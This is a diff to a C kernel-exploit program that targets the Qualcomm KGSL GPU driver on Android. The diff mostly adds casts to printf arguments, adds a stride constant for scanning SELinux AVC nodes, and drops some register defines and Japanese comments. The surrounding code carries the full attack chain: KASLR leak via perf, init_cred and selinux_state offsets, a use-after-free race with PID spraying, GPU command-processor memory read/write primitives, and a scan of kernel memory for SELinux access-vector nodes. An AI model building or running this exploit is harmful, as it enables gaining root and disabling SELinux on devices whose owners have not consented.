@@ -3,6 +3,7 @@
 #include <string.h>
 #include <stdint.h>
 #include <stdbool.h>
+#include <stdarg.h>
 #include <fcntl.h>
 #include <unistd.h>
 #include <errno.h>
@@ -76,6 +77,7 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define BOGUS_SIZE 0x1000
 #define PLACEHOLDER_ADDR 0x710204000ULL
 #define PLACEHOLDER_SIZE 0x10400000ULL
+#define AVC_NODE_STRIDE 72
 
 #define SPRAY_PIDS 2000
 #define VMLINUX_TEXT 0xffffffc010080000ULL
@@ -88,12 +90,6 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define CP_REG_TO_MEM 0x3E
 #define CP_MEM_TO_REG 0x42
 #define CP_WAIT_REG_MEM 0x3C
-
-/* レジスタオフセット (kgsl_iommu.h より) */
-#define KGSL_IOMMU_CTX_TTBR0      0x0020
-#define KGSL_IOMMU_CTX_CONTEXTIDR 0x0034
-#define KGSL_IOMMU_CTX_FSR        0x0058
-#define KGSL_IOMMU_CTX_RESUME     0x0008
 
 static int kgsl_fd = -1;
 static int debug_level = 2;
@@ -248,7 +244,7 @@ static void test_cp_mem_write(uint64_t dst_ga, uint64_t ib_ga, void *ib_m, uint6
 
     memset(dst_m, 0, 16);
     int ret = run_cmd(cmd, dw, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id);
-    printf("  CP_MEM_WRITE: ret=%d, DST[0]=0x%016lx %s\n", ret, *(uint64_t*)dst_m,
+    printf("  CP_MEM_WRITE: ret=%d, DST[0]=0x%016lx %s\n", ret, *(unsigned long*)dst_m,
            (ret == 0 && *(uint64_t*)dst_m == test_val) ? "[OK]" : "[FAIL]");
 }
 
@@ -267,7 +263,7 @@ static void test_cp_mem_to_mem(uint64_t src_ga, uint64_t dst_ga, uint64_t ib_ga,
 
     memset(dst_m, 0, 16);
     int ret = run_cmd(cmd, dw, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id);
-    printf("  CP_MEM_TO_MEM: ret=%d, DST[0]=0x%016lx %s\n", ret, *(uint64_t*)dst_m,
+    printf("  CP_MEM_TO_MEM: ret=%d, DST[0]=0x%016lx %s\n", ret, *(unsigned long*)dst_m,
            (ret == 0 && *(uint64_t*)dst_m != 0) ? "[READABLE]" : "[ZERO]");
 }
 
@@ -300,7 +296,7 @@ static void test_cp_reg_to_mem(uint32_t reg, uint64_t dst_ga, uint64_t ib_ga, vo
 
     memset(dst_m, 0, 16);
     int ret = run_cmd(cmd, dw, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id);
-    printf("  CP_REG_TO_MEM(reg=0x%04X): ret=%d, DST[0]=0x%016lx %s\n", reg, ret, *(uint64_t*)dst_m,
+    printf("  CP_REG_TO_MEM(reg=0x%04X): ret=%d, DST[0]=0x%016lx %s\n", reg, ret, *(unsigned long*)dst_m,
            (ret == 0 && *(uint64_t*)dst_m != 0) ? "[READABLE]" : "[ZERO]");
 }
 
@@ -353,7 +349,7 @@ static void test_indirect_read(uint64_t src_va, uint64_t ib_ga, void *ib_m,
     memset(dst_m, 0, 16);
     if (run_cmd(cmd3, dw3, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id) == 0) {
         result = *(uint64_t*)(dst_m + 8);
-        printf("  Indirect read(0x%lx): 0x%016lx %s\n", src_va, result, (result != 0) ? "[READABLE]" : "[ZERO]");
+        printf("  Indirect read(0x%lx): 0x%016lx %s\n", (unsigned long)src_va, (unsigned long)result, (result != 0) ? "[READABLE]" : "[ZERO]");
     } else {
         printf("  Indirect read: Step3 failed\n");
     }
@@ -401,7 +397,7 @@ static int run_race_pattern(int pattern, uint64_t alloc_flags) {
     if (ov_id < 0) { printf("  ov_id alloc failed\n"); return 0; }
     uint64_t ov_gpuaddr = 0;
     gpuobj_info(ov_id, &ov_gpuaddr, NULL);
-    printf("  Race pattern %d: ov_id=%d ov_gpuaddr=0x%lx\n", pattern, ov_id, ov_gpuaddr);
+    printf("  Race pattern %d: ov_id=%d ov_gpuaddr=0x%lx\n", pattern, ov_id, (unsigned long)ov_gpuaddr);
 
     switch(pattern) {
         case 0: pthread_create(&thr, NULL, race_thread_import, (void*)&race_done); break;
@@ -437,10 +433,8 @@ static int scan_avc_nodes_indirect(uint64_t start, uint64_t end,
     int n = 0;
     uint64_t buf[4];
     for (uint64_t va = start; va < end && n < max_nodes; va += 0x1000) {
-        /* 各ページの先頭から AVC_NODE_STRIDE 刻みでチェック */
         for (uint64_t off = 0; off < 0x1000 && n < max_nodes; off += AVC_NODE_STRIDE) {
             uint64_t node_va = va + off;
-            /* 先頭4ワードを読み出す */
             uint32_t cmd[32];
             int dw = 0;
             uint32_t dl, dh, sl, sh;
@@ -457,7 +451,7 @@ static int scan_avc_nodes_indirect(uint64_t start, uint64_t end,
                 if (p[0] >= 1 && p[0] <= 0x3fff && p[1] == 2 && p[2] == 1) {
                     found_nodes[n++] = node_va;
                     printf("  [AVC] found at 0x%lx (sid=%u, etype=%u, permissive=%u)\n",
-                           node_va, p[0], p[1], p[2]);
+                           (unsigned long)node_va, p[0], p[1], p[2]);
                 }
             }
         }
@@ -484,10 +478,10 @@ int main(int argc, char **argv) {
     printf("[*] KASLR detection via perf...\n");
     uint64_t kaslr = detect_kaslr();
     if (!kaslr) { printf("  Failed\n"); close(kgsl_fd); return 1; }
-    printf("  kaslr=0x%lx\n", kaslr);
+    printf("  kaslr=0x%lx\n", (unsigned long)kaslr);
     uint64_t init_cred_addr = kaslr + VMLINUX_INIT_CRED_OFFSET;
     uint64_t selinux_state_addr = kaslr + VMLINUX_SELINUX_STATE_OFFSET;
-    printf("  init_cred=0x%lx, selinux_state=0x%lx\n", init_cred_addr, selinux_state_addr);
+    printf("  init_cred=0x%lx, selinux_state=0x%lx\n", (unsigned long)init_cred_addr, (unsigned long)selinux_state_addr);
 
     /* GPU オブジェクト初期化 */
     printf("[*] Initializing GPU objects...\n");
@@ -498,7 +492,7 @@ int main(int argc, char **argv) {
     if (!ib_m) die("ib mmap");
     uint64_t ib_ga = 0;
     gpuobj_info(ib_id, &ib_ga, NULL);
-    printf("  IB id=%d gpuaddr=0x%lx\n", ib_id, ib_ga);
+    printf("  IB id=%d gpuaddr=0x%lx\n", ib_id, (unsigned long)ib_ga);
 
     int dst_id = gpuobj_alloc(0x4000, alloc_flags);
     if (dst_id < 0) die("dst alloc");
@@ -506,7 +500,7 @@ int main(int argc, char **argv) {
     if (!dst_m) die("dst mmap");
     uint64_t dst_ga = 0;
     gpuobj_info(dst_id, &dst_ga, NULL);
-    printf("  DST id=%d gpuaddr=0x%lx\n", dst_id, dst_ga);
+    printf("  DST id=%d gpuaddr=0x%lx\n", dst_id, (unsigned long)dst_ga);
 
     unsigned int ctx_id = create_context();
     printf("  Context id=%u\n", ctx_id);
@@ -517,7 +511,6 @@ int main(int argc, char **argv) {
     test_cp_mem_write(dst_ga, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id, test_val);
 
     printf("\n[*] Testing CP_MEM_TO_MEM (original)...\n");
-    /* まず DST に値を書き込んでからコピー */
     test_cp_mem_write(dst_ga, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id, test_val);
     test_cp_mem_to_mem(dst_ga, dst_ga + 8, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id);
 
@@ -538,7 +531,6 @@ int main(int argc, char **argv) {
     /* ===== IMPORT テスト ===== */
     printf("\n[*] Testing KGSL_GPUOBJ_IMPORT parameters...\n");
     uint64_t user_buf[2] = {0x123456789ABCDEF0ULL, 0xFEDCBA9876543210ULL};
-    /* テスト1: 適正サイズ */
     struct kgsl_gpuobj_import_useraddr uaddr1 = { .virtaddr = (uint64_t)(uintptr_t)user_buf };
     struct kgsl_gpuobj_import imp1 = {
         .priv = (uint64_t)&uaddr1,
@@ -550,7 +542,6 @@ int main(int argc, char **argv) {
     printf("  IMPORT(size=%zu) ret=%d errno=%d\n", sizeof(uaddr1), r1, r1 < 0 ? errno : 0);
     if (r1 == 0) { printf("    id=%u\n", imp1.id); gpuobj_free(imp1.id); }
 
-    /* テスト2: ページサイズ */
     struct kgsl_gpuobj_import_useraddr uaddr2 = { .virtaddr = (uint64_t)(uintptr_t)user_buf };
     struct kgsl_gpuobj_import imp2 = {
         .priv = (uint64_t)&uaddr2,
@@ -562,7 +553,6 @@ int main(int argc, char **argv) {
     printf("  IMPORT(size=0x1000) ret=%d errno=%d\n", r2, r2 < 0 ? errno : 0);
     if (r2 == 0) { printf("    id=%u\n", imp2.id); gpuobj_free(imp2.id); }
 
-    /* テスト3: フラグなし */
     struct kgsl_gpuobj_import_useraddr uaddr3 = { .virtaddr = (uint64_t)(uintptr_t)user_buf };
     struct kgsl_gpuobj_import imp3 = {
         .priv = (uint64_t)&uaddr3,
@@ -574,7 +564,6 @@ int main(int argc, char **argv) {
     printf("  IMPORT(flags=0) ret=%d errno=%d\n", r3, r3 < 0 ? errno : 0);
     if (r3 == 0) { printf("    id=%u\n", imp3.id); gpuobj_free(imp3.id); }
 
-    /* テスト4: アドレスをページアライン */
     uint64_t aligned = ((uint64_t)(uintptr_t)user_buf + 0xFFF) & ~0xFFFULL;
     struct kgsl_gpuobj_import_useraddr uaddr4 = { .virtaddr = aligned };
     struct kgsl_gpuobj_import imp4 = {
@@ -587,7 +576,6 @@ int main(int argc, char **argv) {
     printf("  IMPORT(aligned addr, size=0x1000) ret=%d errno=%d\n", r4, r4 < 0 ? errno : 0);
     if (r4 == 0) { printf("    id=%u\n", imp4.id); gpuobj_free(imp4.id); }
 
-    /* テスト5: 巨大サイズ (BOGUS_SIZE 相当) */
     struct kgsl_gpuobj_import_useraddr uaddr5 = { .virtaddr = (uint64_t)(uintptr_t)user_buf };
     struct kgsl_gpuobj_import imp5 = {
         .priv = (uint64_t)&uaddr5,
@@ -615,7 +603,8 @@ int main(int argc, char **argv) {
     void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
         MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
     if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");
-    printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n", UAF_ADDR, BOGUS_ADDR, PLACEHOLDER_ADDR);
+    printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
+           (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR, (unsigned long)PLACEHOLDER_ADDR);
 
     printf("\n[*] Phase 2: Race (trying multiple patterns)\n");
     int race_won = 0;
